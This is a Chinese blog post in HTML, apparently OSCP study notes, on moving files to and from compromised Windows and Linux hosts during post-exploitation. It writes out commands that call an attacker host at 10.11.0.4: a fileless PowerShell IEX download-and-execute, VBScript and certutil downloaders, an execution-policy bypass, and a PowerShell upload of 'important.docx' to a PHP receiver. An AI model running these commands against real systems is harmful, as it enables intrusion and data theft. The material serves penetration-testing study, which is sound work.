@@ -1,0 +1,822 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://avatars.githubusercontent.com/u/62293120?v=4">
+  <link rel="icon" href="https://avatars.githubusercontent.com/u/62293120?v=4">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="C47Sh4rk">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="为后渗透做准备">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件传输">
+<meta property="og:url" content="https://c47sh4rk.github.io/2022/08/17/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/index.html">
+<meta property="og:site_name" content="C47Sh4rk&#39;s Blog">
+<meta property="og:description" content="为后渗透做准备">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220817160333.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220817162700.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220817162725.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220817170456.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220817170656.png">
+<meta property="article:published_time" content="2022-08-17T07:32:03.000Z">
+<meta property="article:modified_time" content="2023-02-26T08:05:47.000Z">
+<meta property="article:author" content="C47Sh4rk">
+<meta property="article:tag" content="OSCP">
+<meta property="article:tag" content="web渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220817160333.png">
+  
+  
+  
+  <title>文件传输 - C47Sh4rk&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"c47sh4rk.github.io","root":"/","version":"1.9.1","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>C47Sh4rk&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/0%20(2).png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="文件传输"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-08-17 15:32" pubdate>
+          2022年8月17日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          43 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">文件传输</h1>
+            
+            <div class="markdown-body">
+              
+              <h3 id="传输文件"><a href="#传输文件" class="headerlink" title="传输文件"></a>传输文件</h3><ul>
+<li>后渗透测试阶段: 突破边界并在目标主机商获得初始第权限账号</li>
+<li>后渗透测试阶段任务<ol>
+<li>权限提升</li>
+<li>扩大控制</li>
+<li>横向平移</li>
+<li>安装后门</li>
+<li>清理攻击痕迹</li>
+<li>上传工具文件</li>
+</ol>
+</li>
+</ul>
+<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="传输攻击工具的风险"><a href="#传输攻击工具的风险" class="headerlink" title="传输攻击工具的风险"></a>传输攻击工具的风险</h3><ul>
+<li>文档记录上传的攻击工具, 渗透结束后及时清除, 避免被其他人恶意利用</li>
+<li>终端防病毒系统的干扰, 触发告警, 导致渗透失败</li>
+<li>原则: 尽量使用目标系统本身已有的软件工具, 上传工具只作为补充</li>
+</ul>
+<h3 id="Pure-FTPd"><a href="#Pure-FTPd" class="headerlink" title="Pure-FTPd"></a>Pure-FTPd</h3><ul>
+<li>安装<ul>
+<li><code>kali@kali:~$ sudo apt update &amp;&amp; sudo apt install pure-ftpd</code></li>
+</ul>
+</li>
+<li>创建服务账号<ul>
+<li><code>./steup-ftp.sh</code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>groupadd ftpgroup<br>useradd -g ftpgroup -d /dev/null -s /etc ftpuser <br>pure-pw useradd offsec -u ftpuser -d /ftphome <br>pure-pw mkdb<br><span class="hljs-built_in">cd</span> /etc/pure-ftpd/auth/<br><span class="hljs-built_in">ln</span> -s ../conf/PureDB 60pdb<br><span class="hljs-built_in">mkdir</span> -p /ftphome<br><span class="hljs-built_in">chown</span> -R ftpuser:ftpgroup /ftphome/<br>systemctl restart pure-ftpd<br></code></pre></td></tr></table></figure>
+<img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220817160333.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+</li>
+</ul>
+<h3 id="非交互式Shell"><a href="#非交互式Shell" class="headerlink" title="非交互式Shell"></a>非交互式Shell</h3><ul>
+<li>大部分nc类软件可建立非交互式shell, 但其功能受限<ul>
+<li>基于nc shell 执行ftp交互命令或者vi编辑文本时, 皆无回显</li>
+</ul>
+</li>
+<li>升级非交互式Shell<ul>
+<li>Python 解释器经常安装在 Linux 系统上，带有一个名为 pty 的标准模块，允许创建伪终端<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220817162700.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220817162725.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Windows系统传输文件"><a href="#Windows系统传输文件" class="headerlink" title="Windows系统传输文件"></a>Windows系统传输文件</h2><h3 id="Win传文件"><a href="#Win传文件" class="headerlink" title="Win传文件"></a>Win传文件</h3><ul>
+<li>Linux默认安装netcat、wget、curl等软件, 传输文件相对容易, Win系统缺乏此类工具</li>
+<li>非交互FTP下载<ul>
+<li>Windows 操作系统附带可用于文件传输的默认 FTP 客户端(交互式程序), -s可以指定包含FTP指令的源文件, 实现非交互式传文件<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell">C:\Users\offsec&gt;<span class="hljs-built_in">echo</span> open <span class="hljs-number">10.11</span>.<span class="hljs-number">0.4</span> <span class="hljs-number">21</span>&gt; ftp.txt<br>C:\Users\offsec&gt;<span class="hljs-built_in">echo</span> USER offsec &gt;&gt; ftp.txt<br>C:\Users\offsec&gt;<span class="hljs-built_in">echo</span> lab &gt;&gt; ftp.txt<br>C:\Users\offsec&gt;<span class="hljs-built_in">echo</span> bin &gt;&gt; ftp.txt<br>C:\Users\offsec&gt;<span class="hljs-built_in">echo</span> GET nc.exe &gt;&gt; ftp.txt<br>C:\Users\offsec&gt;<span class="hljs-built_in">echo</span> bye &gt;&gt; ftp.txt<br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>利用以上指令源文件下载nc<ul>
+<li><code>C:\Users\offsec&gt; ftp -v -n -s:ftp.txt</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="使用脚本下载文件"><a href="#使用脚本下载文件" class="headerlink" title="使用脚本下载文件"></a>使用脚本下载文件</h3><ul>
+<li><p>WinXP 2003可以用vbs下载文件</p>
+</li>
+<li><p>Win7 2008以上可以用powershell传输</p>
+</li>
+<li><p>VBScript脚本(wget.vbs)</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">echo</span> strUrl = WScript.Arguments.Item(<span class="hljs-number">0</span>) &gt; wget.vbs<br><span class="hljs-built_in">echo</span> StrFile = WScript.Arguments.Item(<span class="hljs-number">1</span>) &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> Const HTTPREQUEST_PROXYSETTING_DEFAULT = <span class="hljs-number">0</span> &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> Const HTTPREQUEST_PROXYSETTING_PRECONFIG = <span class="hljs-number">0</span> &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> Const HTTPREQUEST_PROXYSETTING_DIRECT = <span class="hljs-number">1</span> &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> Const HTTPREQUEST_PROXYSETTING_PROXY = <span class="hljs-number">2</span> &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> Err.Clear &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> http = Nothing &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> http = CreateObject(<span class="hljs-string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>) &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> <span class="hljs-keyword">If</span> http Is Nothing Then <span class="hljs-built_in">Set</span> http = CreateObject(<span class="hljs-string">&quot;WinHttp.WinHttpRequest&quot;</span>) &gt;&gt; wge t.vbs<br><span class="hljs-built_in">echo</span> <span class="hljs-keyword">If</span> http Is Nothing Then <span class="hljs-built_in">Set</span> http = CreateObject(<span class="hljs-string">&quot;MSXML2.ServerXMLHTTP&quot;</span>) &gt;&gt; <span class="hljs-built_in">wget</span>. vbs<br><span class="hljs-built_in">echo</span> <span class="hljs-keyword">If</span> http Is Nothing Then <span class="hljs-built_in">Set</span> http = CreateObject(<span class="hljs-string">&quot;Microsoft.XMLHTTP&quot;</span>) &gt;&gt; wget.vbs <span class="hljs-built_in">echo</span> http.Open <span class="hljs-string">&quot;GET&quot;</span>, strURL, False &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> http.Send &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> varByteArray = http.ResponseBody &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> http = Nothing &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> fs = CreateObject(<span class="hljs-string">&quot;Scripting.FileSystemObject&quot;</span>) &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> ts = fs.CreateTextFile(StrFile, True) &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> strData = <span class="hljs-string">&quot;&quot;</span> &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> strBuffer = <span class="hljs-string">&quot;&quot;</span> &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> <span class="hljs-keyword">For</span> lngCounter = <span class="hljs-number">0</span> to UBound(varByteArray) &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> ts.Write Chr(<span class="hljs-number">255</span> And Ascb(Midb(varByteArray,lngCounter + <span class="hljs-number">1</span>, <span class="hljs-number">1</span>))) &gt;&gt; wget.vbs <span class="hljs-built_in">echo</span> Next &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> ts.Close &gt;&gt; wget.vbs<br></code></pre></td></tr></table></figure></li>
+<li><p>运行脚本</p>
+<ul>
+<li><code>C:\Users\Offsec&gt; cscript wget.vbs http://10.11.0.4/evil.exe evil.exe</code></li>
+</ul>
+</li>
+<li><p>powershell脚本</p>
+<ul>
+<li>Powershell默认策略、配置影响脚本的执行, 需要增加绕过限制的参数</li>
+<li><code>C:\Users\Offsec&gt; powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoPro file -File wget.ps1</code></li>
+<li>-ExecutionPolicy Bypass # 绕过默认执行策略</li>
+<li>-NoLogo -NonInteractive # 隐藏powershell logo、banner、交互提示信息</li>
+<li>-NoProfile # 禁用默认配置文件</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$webclient</span> = <span class="hljs-built_in">New-Object</span> System.Net.WebClient &gt;&gt; wget.ps1<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;http://10.11.0.4/evil.exe&quot;</span> &gt;&gt; wget.ps1<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;new-exploit.exe&quot;</span> &gt;&gt; wget.ps1<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$webclient</span>.DownloadFile(<span class="hljs-variable">$url</span>,<span class="hljs-variable">$file</span>) &gt;&gt; wget.ps1<br></code></pre></td></tr></table></figure>
+
+<h3 id="解析域名地址"><a href="#解析域名地址" class="headerlink" title="解析域名地址"></a>解析域名地址</h3><ul>
+<li>Powershell一行式命令下载文件<ul>
+<li><code>C:\Users\Offsec&gt; powershell.exe (New-Object System.Net.WebClient).DownloadFile(&#39;http:/ /10.11.0.4/evil.exe&#39;, &#39;new-exploit.exe&#39;)</code></li>
+</ul>
+</li>
+<li>下载后直接执行脚本(无文件落地)<ul>
+<li><code>C:\Users\Offsec&gt; powershell.exe IEX (New-Object System.Net.WebClient).DownloadString(&#39; http://10.11.0.4/helloworld.ps1&#39;)</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="exe2hex-powershell"><a href="#exe2hex-powershell" class="headerlink" title="exe2hex + powershell"></a>exe2hex + powershell</h3><ul>
+<li>将执行程序转换为HEX字符串, 并将其嵌入到Windows脚本中<ul>
+<li>powershell将HEX还原为二进制流并执行(非交互)</li>
+</ul>
+</li>
+<li>压缩打包PE程序(二进制)<ul>
+<li><code>kali@kali:~$ upx -9 nc.exe</code></li>
+</ul>
+</li>
+<li>将PE文件转换为HEX格式<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220817170456.png" srcset="/img/loading.gif" lazyload></li>
+<li>复制nc.cmd文件中的全部内容, 在非交互shell执行<ul>
+<li>使用powershell还原并执行代码<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-Command</span> <span class="hljs-string">&quot;<span class="hljs-variable">$h</span>=Get-Content -readcount 0 -path &#x27;./nc.hex&#x27;;<span class="hljs-variable">$l</span>=<span class="hljs-variable">$h</span>[0].length;<span class="hljs-variable">$b</span>=N ew-Object byte[] (<span class="hljs-variable">$l</span>/2);<span class="hljs-variable">$x</span>=0;for (<span class="hljs-variable">$i</span>=0;<span class="hljs-variable">$i</span> -le <span class="hljs-variable">$l</span>-1;<span class="hljs-variable">$i</span>+=2)&#123;<span class="hljs-variable">$b</span>[<span class="hljs-variable">$x</span>]=[byte]::Parse(<span class="hljs-variable">$h</span>[0].S ubstring(<span class="hljs-variable">$i</span>,2),[System.Globalization.NumberStyles]::HexNumber);<span class="hljs-variable">$x</span>+=1&#125;;set-content -enc oding byte &#x27;nc.exe&#x27; -value <span class="hljs-variable">$b</span>;Remove-Item -force nc.hex;&quot;</span><br></code></pre></td></tr></table></figure>
+<img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220817170656.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+</li>
+</ul>
+<h3 id="使用Windows脚本上传文件"><a href="#使用Windows脚本上传文件" class="headerlink" title="使用Windows脚本上传文件"></a>使用Windows脚本上传文件</h3><ul>
+<li>在kali上创建接收脚本<ul>
+<li>&#x2F;var&#x2F;www&#x2F;html&#x2F;upload.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$uploaddir</span> = <span class="hljs-string">&#x27;/var/www/uploads/&#x27;</span>;<br><span class="hljs-variable">$uploadfile</span> = <span class="hljs-variable">$uploaddir</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$uploadfile</span>) <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>创建目录接收文件<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">kali@kali:/var/www$ sudo <span class="hljs-built_in">mkdir</span> /var/www/uploads<br>kali@kali:/var/www$ ps -ef | grep apache<br>root 1946 1 0 21:39 ? 00:00:00 /usr/sbin/apache2 -k start www-data 1947 1946 0 21:39 ? 00:00:00 /usr/sbin/apache2 -k start<br>kali@kali:/var/www$ sudo <span class="hljs-built_in">chown</span> www-data: /var/www/uploads<br>kali@kali:/var/www$ <span class="hljs-built_in">ls</span> -la<br>total 16<br>drwxr-xr-x 4 root root<br>drwxr-xr-x 13 root root<br>drwxr-xr-x 2 root root<br>drwxr-xr-x 2 www-data www-data 4096 Feb 2 00:33 uploads<br></code></pre></td></tr></table></figure></li>
+<li>从Windows主机上传到kali<ul>
+<li><code>C:\Users\0ffsec&gt; powershell (New-0bject System.Net.WebClient).UploadFile(&#39;http://10.11.0.4/upload.php&#39;, &#39;important.docx&#39;)</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="其他方法传输文件"><a href="#其他方法传输文件" class="headerlink" title="其他方法传输文件"></a>其他方法传输文件</h3><ul>
+<li><p>certutil</p>
+<ul>
+<li>certutil.exe -urlcache -split -f “<a target="_blank" rel="noopener" href="https://10.0.2.15/files/nc.zip&quot;">https://10.0.2.15/files/nc.zip&quot;</a> nc.zip</li>
+</ul>
+</li>
+<li><p>rdesktop.</p>
+<ul>
+<li>远程桌面连接同时挂载共享文件夹</li>
+<li><code>rdesktop -u user a.b.c.d -p pass -g 1200x900 -x 0x80 -r sound:local -r disk:LinuxPictures=/home/user/Pictures</code></li>
+<li><code>xfreerdp /u:user /p:pass /w:1200 /h:900 /v:10.0.2.5 /drive:drive1,/home/kali</code></li>
+</ul>
+</li>
+</ul>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/OSCP-Notes/" class="category-chain-item">OSCP-Notes</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/OSCP/">#OSCP</a>
+      
+        <a href="/tags/web%E6%B8%97%E9%80%8F/">#web渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>文件传输</div>
+      <div>https://c47sh4rk.github.io/2022/08/17/文件传输/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>C47Sh4rk</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年8月17日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/08/17/%E8%A7%84%E9%81%BF%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6/" title="规避杀毒软件">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">规避杀毒软件</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/08/16/%E4%BF%AE%E5%A4%8DEXP%E4%BB%A3%E7%A0%81/" title="修复EXP代码">
+                        <span class="hidden-mobile">修复EXP代码</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
